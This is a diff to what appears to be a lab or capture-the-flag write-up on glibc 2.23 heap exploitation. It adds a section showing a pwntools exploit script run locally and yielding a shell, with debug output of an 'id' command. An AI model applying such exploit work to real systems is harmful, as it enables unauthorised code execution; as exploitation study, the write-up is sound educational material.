@@ -459,6 +459,17 @@ p.sendlineafter('content:',str(0x20))
 p.interactive()
 ```
 
+Get a shell by running that script locally
+```
+user@a1521106dfd1:~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64$ python3 sploit.py                                       
+...
+$ id
+[DEBUG] Sent 0x3 bytes:
+    b'id\n'
+[DEBUG] Received 0x39 bytes:
+    b'uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)\n'
+uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
+```
 
 ## Conclusion
 
